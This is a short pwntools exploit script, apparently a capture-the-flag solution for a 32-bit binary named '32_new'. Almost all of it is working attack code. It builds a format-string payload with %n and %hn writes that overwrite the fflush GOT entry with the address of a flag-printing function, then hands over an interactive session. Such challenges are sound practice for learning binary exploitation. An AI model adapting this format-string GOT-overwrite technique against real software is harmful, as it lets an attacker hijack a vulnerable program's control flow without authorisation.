#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template 32_new
from pwn import *

context.terminal = ["tmux", "splitw", "-h"]

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or '32_new')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
start
bp 0x080487d7
c
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)

io = start()

flag_addr = 0x0804870b
got_fflush = exe.got['fflush'] #0x804a028
print(f"flag addr: {hex(flag_addr)}")
print(f"got_fflush: {hex(got_fflush)}")

payload = flat(
    got_fflush+2,  #0x804a02a  
    got_fflush,    #0x804a028
    b"%1974d%10$n",
    b"%32519d%11$hn"

)

io.sendlineafter(b"Hello baby pwner, whats your name?", payload)

io.interactive()

